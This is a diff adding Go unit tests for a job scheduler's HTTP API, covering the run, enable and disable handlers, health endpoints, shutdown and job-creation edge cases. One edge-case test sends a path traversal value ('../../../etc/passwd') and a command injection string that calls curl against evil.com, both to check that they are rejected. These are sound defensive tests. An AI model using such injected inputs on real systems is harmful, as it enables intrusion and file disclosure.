@@ -1,6 +1,7 @@
 package web_test
 
 import (
+	"context"
 	"encoding/json"
 	"fmt"
 	"net/http"
@@ -545,3 +546,357 @@ func TestCreateJobTypes(t *testing.T) {
 		}
 	}
 }
+
+// New tests for missing coverage
+
+func TestRunJobHandler(t *testing.T) {
+	sched := core.NewScheduler(&stubLogger{})
+	job := &testJob{}
+	job.Name = "test-run-job"
+	job.Schedule = schedDaily
+	job.Command = cmdEcho
+	_ = sched.AddJob(job)
+	_ = sched.Start() // Start the scheduler to initialize workflow orchestrator
+
+	srv := webpkg.NewServer("", sched, nil, nil)
+	httpSrv := srv.HTTPServer()
+
+	t.Run("success", func(t *testing.T) {
+		body := `{"name":"test-run-job"}`
+		req := httptest.NewRequest("POST", "/api/jobs/run", strings.NewReader(body))
+		req.Header.Set("Content-Type", "application/json")
+		w := httptest.NewRecorder()
+		httpSrv.Handler.ServeHTTP(w, req)
+
+		if w.Code != http.StatusNoContent {
+			t.Errorf("expected status 204, got %d", w.Code)
+		}
+	})
+
+	t.Run("invalid_json", func(t *testing.T) {
+		body := `{invalid json}`
+		req := httptest.NewRequest("POST", "/api/jobs/run", strings.NewReader(body))
+		req.Header.Set("Content-Type", "application/json")
+		w := httptest.NewRecorder()
+		httpSrv.Handler.ServeHTTP(w, req)
+
+		if w.Code != http.StatusBadRequest {
+			t.Errorf("expected status 400, got %d", w.Code)
+		}
+	})
+
+	t.Run("job_not_found", func(t *testing.T) {
+		body := `{"name":"nonexistent-job"}`
+		req := httptest.NewRequest("POST", "/api/jobs/run", strings.NewReader(body))
+		req.Header.Set("Content-Type", "application/json")
+		w := httptest.NewRecorder()
+		httpSrv.Handler.ServeHTTP(w, req)
+
+		if w.Code != http.StatusBadRequest {
+			t.Errorf("expected status 400, got %d", w.Code)
+		}
+	})
+}
+
+func TestDisableJobHandler(t *testing.T) {
+	sched := core.NewScheduler(&stubLogger{})
+	job := &testJob{}
+	job.Name = "test-disable-job"
+	job.Schedule = schedDaily
+	job.Command = cmdEcho
+	_ = sched.AddJob(job)
+
+	srv := webpkg.NewServer("", sched, nil, nil)
+	httpSrv := srv.HTTPServer()
+
+	t.Run("success", func(t *testing.T) {
+		body := `{"name":"test-disable-job"}`
+		req := httptest.NewRequest("POST", "/api/jobs/disable", strings.NewReader(body))
+		req.Header.Set("Content-Type", "application/json")
+		w := httptest.NewRecorder()
+		httpSrv.Handler.ServeHTTP(w, req)
+
+		if w.Code != http.StatusNoContent {
+			t.Errorf("expected status 204, got %d", w.Code)
+		}
+
+		// Verify job is disabled
+		disabled := sched.GetDisabledJobs()
+		if len(disabled) != 1 {
+			t.Errorf("expected 1 disabled job, got %d", len(disabled))
+		}
+	})
+
+	t.Run("invalid_json", func(t *testing.T) {
+		body := `{invalid}`
+		req := httptest.NewRequest("POST", "/api/jobs/disable", strings.NewReader(body))
+		req.Header.Set("Content-Type", "application/json")
+		w := httptest.NewRecorder()
+		httpSrv.Handler.ServeHTTP(w, req)
+
+		if w.Code != http.StatusBadRequest {
+			t.Errorf("expected status 400, got %d", w.Code)
+		}
+	})
+
+	t.Run("job_not_found", func(t *testing.T) {
+		body := `{"name":"nonexistent-job"}`
+		req := httptest.NewRequest("POST", "/api/jobs/disable", strings.NewReader(body))
+		req.Header.Set("Content-Type", "application/json")
+		w := httptest.NewRecorder()
+		httpSrv.Handler.ServeHTTP(w, req)
+
+		if w.Code != http.StatusBadRequest {
+			t.Errorf("expected status 400, got %d", w.Code)
+		}
+	})
+}
+
+func TestEnableJobHandler(t *testing.T) {
+	sched := core.NewScheduler(&stubLogger{})
+	job := &testJob{}
+	job.Name = "test-enable-job"
+	job.Schedule = schedDaily
+	job.Command = cmdEcho
+	_ = sched.AddJob(job)
+	_ = sched.DisableJob("test-enable-job")
+
+	srv := webpkg.NewServer("", sched, nil, nil)
+	httpSrv := srv.HTTPServer()
+
+	t.Run("success", func(t *testing.T) {
+		body := `{"name":"test-enable-job"}`
+		req := httptest.NewRequest("POST", "/api/jobs/enable", strings.NewReader(body))
+		req.Header.Set("Content-Type", "application/json")
+		w := httptest.NewRecorder()
+		httpSrv.Handler.ServeHTTP(w, req)
+
+		if w.Code != http.StatusNoContent {
+			t.Errorf("expected status 204, got %d", w.Code)
+		}
+
+		// Verify job is enabled
+		if sched.GetJob("test-enable-job") == nil {
+			t.Error("job should be enabled")
+		}
+	})
+
+	t.Run("invalid_json", func(t *testing.T) {
+		body := `{bad json}`
+		req := httptest.NewRequest("POST", "/api/jobs/enable", strings.NewReader(body))
+		req.Header.Set("Content-Type", "application/json")
+		w := httptest.NewRecorder()
+		httpSrv.Handler.ServeHTTP(w, req)
+
+		if w.Code != http.StatusBadRequest {
+			t.Errorf("expected status 400, got %d", w.Code)
+		}
+	})
+
+	t.Run("job_not_found", func(t *testing.T) {
+		body := `{"name":"nonexistent-job"}`
+		req := httptest.NewRequest("POST", "/api/jobs/enable", strings.NewReader(body))
+		req.Header.Set("Content-Type", "application/json")
+		w := httptest.NewRecorder()
+		httpSrv.Handler.ServeHTTP(w, req)
+
+		if w.Code != http.StatusBadRequest {
+			t.Errorf("expected status 400, got %d", w.Code)
+		}
+	})
+}
+
+func TestHistoryHandler_NotFound(t *testing.T) {
+	sched := core.NewScheduler(&stubLogger{})
+	srv := webpkg.NewServer("", sched, nil, nil)
+	httpSrv := srv.HTTPServer()
+
+	t.Run("job_not_found", func(t *testing.T) {
+		req := httptest.NewRequest("GET", "/api/jobs/nonexistent/history", nil)
+		w := httptest.NewRecorder()
+		httpSrv.Handler.ServeHTTP(w, req)
+
+		if w.Code != http.StatusNotFound {
+			t.Errorf("expected status 404, got %d", w.Code)
+		}
+	})
+
+	t.Run("invalid_path", func(t *testing.T) {
+		req := httptest.NewRequest("GET", "/api/jobs/test-job/invalid", nil)
+		w := httptest.NewRecorder()
+		httpSrv.Handler.ServeHTTP(w, req)
+
+		if w.Code != http.StatusNotFound {
+			t.Errorf("expected status 404, got %d", w.Code)
+		}
+	})
+}
+
+func TestShutdown(t *testing.T) {
+	sched := core.NewScheduler(&stubLogger{})
+	srv := webpkg.NewServer(":0", sched, nil, nil)
+
+	// Start the server
+	err := srv.Start()
+	if err != nil {
+		t.Fatalf("failed to start server: %v", err)
+	}
+
+	// Give it a moment to start
+	time.Sleep(10 * time.Millisecond)
+
+	// Test shutdown
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+
+	err = srv.Shutdown(ctx)
+	if err != nil {
+		t.Errorf("shutdown failed: %v", err)
+	}
+}
+
+func TestRegisterHealthEndpoints(t *testing.T) {
+	sched := core.NewScheduler(&stubLogger{})
+	srv := webpkg.NewServer("", sched, nil, nil)
+
+	hc := webpkg.NewHealthChecker(nil, "test-version")
+	// Give the health checker time to run initial checks
+	time.Sleep(50 * time.Millisecond)
+
+	srv.RegisterHealthEndpoints(hc)
+
+	httpSrv := srv.HTTPServer()
+
+	t.Run("health_endpoint", func(t *testing.T) {
+		req := httptest.NewRequest("GET", "/health", nil)
+		w := httptest.NewRecorder()
+		httpSrv.Handler.ServeHTTP(w, req)
+
+		if w.Code != http.StatusOK {
+			t.Errorf("expected status 200, got %d", w.Code)
+		}
+
+		var response map[string]interface{}
+		if err := json.NewDecoder(w.Body).Decode(&response); err != nil {
+			t.Fatalf("failed to decode response: %v", err)
+		}
+
+		if response["version"] != "test-version" {
+			t.Errorf("expected version 'test-version', got %v", response["version"])
+		}
+	})
+
+	t.Run("healthz_endpoint", func(t *testing.T) {
+		req := httptest.NewRequest("GET", "/healthz", nil)
+		w := httptest.NewRecorder()
+		httpSrv.Handler.ServeHTTP(w, req)
+
+		if w.Code != http.StatusOK {
+			t.Errorf("expected status 200, got %d", w.Code)
+		}
+	})
+
+	t.Run("ready_endpoint", func(t *testing.T) {
+		req := httptest.NewRequest("GET", "/ready", nil)
+		w := httptest.NewRecorder()
+		httpSrv.Handler.ServeHTTP(w, req)
+
+		// Ready endpoint returns 503 if Docker is unhealthy, which is expected without Docker provider
+		if w.Code != http.StatusServiceUnavailable && w.Code != http.StatusOK {
+			t.Errorf("expected status 200 or 503, got %d", w.Code)
+		}
+	})
+
+	t.Run("live_endpoint", func(t *testing.T) {
+		req := httptest.NewRequest("GET", "/live", nil)
+		w := httptest.NewRecorder()
+		httpSrv.Handler.ServeHTTP(w, req)
+
+		if w.Code != http.StatusOK {
+			t.Errorf("expected status 200, got %d", w.Code)
+		}
+
+		body := w.Body.String()
+		if body != "OK" {
+			t.Errorf("expected body 'OK', got %q", body)
+		}
+	})
+}
+
+func TestJobFromRequest_EdgeCases(t *testing.T) {
+	sched := core.NewScheduler(&stubLogger{})
+	srv := webpkg.NewServer("", sched, nil, nil)
+	httpSrv := srv.HTTPServer()
+
+	t.Run("unknown_job_type", func(t *testing.T) {
+		body := `{"name":"test","type":"unknown","schedule":"@hourly"}`
+		req := httptest.NewRequest("POST", "/api/jobs/create", strings.NewReader(body))
+		req.Header.Set("Content-Type", "application/json")
+		w := httptest.NewRecorder()
+		httpSrv.Handler.ServeHTTP(w, req)
+
+		if w.Code != http.StatusBadRequest {
+			t.Errorf("expected status 400, got %d", w.Code)
+		}
+	})
+
+	t.Run("empty_type_creates_local", func(t *testing.T) {
+		body := `{"name":"empty-type","type":"","schedule":"@hourly","command":"echo test"}`
+		req := httptest.NewRequest("POST", "/api/jobs/create", strings.NewReader(body))
+		req.Header.Set("Content-Type", "application/json")
+		w := httptest.NewRecorder()
+		httpSrv.Handler.ServeHTTP(w, req)
+
+		if w.Code != http.StatusCreated {
+			t.Errorf("expected status 201, got %d", w.Code)
+		}
+
+		job := sched.GetJob("empty-type")
+		if job == nil {
+			t.Fatal("expected job to be created")
+		}
+		if _, ok := job.(*core.LocalJob); !ok {
+			t.Errorf("expected LocalJob, got %T", job)
+		}
+	})
+
+	t.Run("compose_invalid_service", func(t *testing.T) {
+		body := `{"name":"comp-invalid","type":"compose","schedule":"@hourly","service":"../../../etc/passwd"}`
+		req := httptest.NewRequest("POST", "/api/jobs/create", strings.NewReader(body))
+		req.Header.Set("Content-Type", "application/json")
+		w := httptest.NewRecorder()
+		httpSrv.Handler.ServeHTTP(w, req)
+
+		if w.Code != http.StatusBadRequest {
+			t.Errorf("expected status 400 for invalid service, got %d", w.Code)
+		}
+	})
+
+	t.Run("local_invalid_command", func(t *testing.T) {
+		body := `{"name":"local-invalid","type":"local","schedule":"@hourly","command":"echo & curl http://evil.com"}`
+		req := httptest.NewRequest("POST", "/api/jobs/create", strings.NewReader(body))
+		req.Header.Set("Content-Type", "application/json")
+		w := httptest.NewRecorder()
+		httpSrv.Handler.ServeHTTP(w, req)
+
+		if w.Code != http.StatusBadRequest {
+			t.Errorf("expected status 400 for invalid command, got %d", w.Code)
+		}
+	})
+}
+
+func TestGetHTTPServer(t *testing.T) {
+	sched := core.NewScheduler(&stubLogger{})
+	srv := webpkg.NewServer("", sched, nil, nil)
+
+	httpSrv := srv.GetHTTPServer()
+	if httpSrv == nil {
+		t.Error("GetHTTPServer() should return non-nil server")
+	}
+
+	// Verify it's the same as HTTPServer()
+	if httpSrv != srv.HTTPServer() {
+		t.Error("GetHTTPServer() and HTTPServer() should return the same instance")
+	}
+}
+
